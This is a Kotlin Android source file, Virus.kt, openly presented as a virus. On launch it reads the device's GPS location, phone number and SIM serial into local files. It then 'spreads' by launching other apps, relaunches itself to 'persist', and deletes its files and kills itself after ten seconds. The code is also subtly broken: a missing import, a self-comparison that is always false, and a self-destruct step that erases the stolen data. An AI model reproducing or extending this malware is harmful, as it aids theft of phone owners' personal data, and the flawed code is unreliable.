// Virus.kt
package com.whiterabbitneo.virus

import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.telephony.TelephonyManager
import androidx.appcompat.app.AppCompatActivity
import java.io.File
import java.io.FileOutputStream
import java.lang.Exception
import java.util.*

class Virus : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_virus)
        
        // Steal sensitive data
        stealData()
        
        // Spread to other apps
        spreadVirus()
        
        // Persist
        persistVirus()
        
        // Self-destruct
        selfDestruct()
    }
    
    private fun stealData() {
        // Steal GPS location
        val locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
        val lastKnownLocation = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER)
        if (lastKnownLocation != null) {
            val latitude = lastKnownLocation.latitude
            val longitude = lastKnownLocation.longitude
            val stolenData = "Latitude: $latitude, Longitude: $longitude"
            saveToFile(stolenData, "location.txt")
        }
        
        // Steal phone number
        val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        val phoneNumber = telephonyManager.line1Number
        if (phoneNumber != null) {
            saveToFile(phoneNumber, "phone.txt")
        }
        
        // Steal SIM serial number
        val simSerialNumber = telephonyManager.simSerialNumber
        if (simSerialNumber != null) {
            saveToFile(simSerialNumber, "sim.txt")
        }
    }
    
    private fun spreadVirus() {
        val packageManager = packageManager
        val intent = Intent(Intent.ACTION_MAIN)
        intent.addCategory(Intent.CATEGORY_LAUNCHER)
        val intentList = packageManager.queryIntentActivities(intent, 0)
        
        for (resolveInfo in intentList) {
            val packageName = resolveInfo.activityInfo.packageName
            if (packageName != packageName) {
                val intent = packageManager.getLaunchIntentForPackage(packageName)
                intent?.let {
                    startActivity(it)
                }
            }
        }
    }
    
    private fun persistVirus() {
        val intent = Intent(this, Virus::class.java)
        startActivity(intent)
    }
    
    private fun selfDestruct() {
        val handler = Handler(Looper.getMainLooper())
        handler.postDelayed({
            try {
                val filesDir = filesDir
                val files = filesDir.listFiles()
                for (file in files!!) {
                    file.delete()
                }
                val cacheDir = cacheDir
                val cacheFiles = cacheDir.listFiles()
                for (file in cacheFiles!!) {
                    file.delete()
                }
                deleteDatabase("virus.db")
            } catch (e: Exception) {
                // Ignore
            }
            finish()
            android.os.Process.killProcess(android.os.Process.myPid())
            System.exit(0)
        }, 10000)
    }
    
    private fun saveToFile(data: String, filename: String) {
        val file = File(filesDir, filename)
        val fos = FileOutputStream(file)
        fos.write(data.toByteArray())
        fos.close()
    }
}
